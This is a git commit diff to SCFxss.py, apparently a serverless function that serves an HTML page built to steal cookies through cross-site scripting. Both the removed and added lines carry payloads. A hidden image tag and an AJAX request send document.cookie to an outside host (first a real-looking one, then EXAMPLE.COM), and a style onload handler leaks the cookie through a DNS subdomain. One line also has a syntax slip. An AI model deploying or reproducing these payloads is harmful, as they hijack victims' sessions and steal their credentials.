b196fff609b3597bf6794b47d4a6cb685b099352
Sh4d0w_小白 <50265741+914525753@users.noreply.github.com>
2022-05-09 20:31:33 +0800

    Update SCFxss.py

--- SCFxss.py
+++ SCFxss.py
@@ -4,8 +4,8 @@
 
 def main_handler(event, context):
     html = '<html><head><meta http-equiv="Access-Control-Allow-Origin" content="*"><script src=https://libs.baidu.com/jquery/2.1.4/jquery.min.js></script>'
-    html += '<script async="async">function XssImg(){var src="http://8lbfgo.cEyE.Io/?cookie="+document.cookie;$("html").append("<div id=xss></div>");$("#xss").css("display","none");$("#xss").append("<Img/Src="+src+" />")}XssImg();$.ajax({type:"GET",dataType:"html",url:"http://8lbfgo.cEyE.Io",data:"cookie="+document.cookie,});</script></head>'
-    html += '<img id="shadow" style="display:none;"></img><style/onload=\'function xss(){var cookie=(document.cookie)?document.cookie:"nocookie";var src="http://"+cookie+".www.exmaple.com/1.jpg"document.getElementById("shadow").setAttribute("src",src)}xss();\'></style>'
+    html += '<script async="async">function XssImg(){var src="http://EXAMPLE.COM/?cookie="+document.cookie;$("html").append("<div id=xss></div>");$("#xss").css("display","none");$("#xss").append("<Img/Src="+src+" />")}XssImg();$.ajax({type:"GET",dataType:"html",url:"http://EXAMPLE.COM",data:"cookie="+document.cookie,});</script></head>'
+    html += '<img id="shadow" style="display:none;"></img><style/onload=\'function xss(){var cookie=(document.cookie)?document.cookie:"nocookie";var src="http://"+cookie+".EXAMPLE.COM/1.jpg"document.getElementById("shadow").setAttribute("src",src)}xss();\'></style>'
     html += "</html>"
 
     response={   
